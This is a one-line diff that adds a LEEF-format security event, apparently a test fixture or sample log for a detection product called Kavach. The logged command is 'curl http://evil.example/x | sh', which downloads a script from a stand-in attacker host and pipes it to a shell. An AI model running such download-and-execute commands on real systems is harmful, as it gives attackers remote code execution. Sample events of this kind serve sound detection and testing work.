@@ -1,0 +1,1 @@
+LEEF:2.0|Zyvor AI Labs|Kavach|1.0|process-start|^|cat=process^sev=1^devTime=2026-01-02T03:04:05.123Z^devTimeFormat=yyyy-MM-dd'T'HH:mm:ss.SSS'Z'^identHostName=web-01^eventId=e1^pid=4242^exe=/usr/bin/curl^usrName=1000^cmd=curl http://evil.example/x | sh
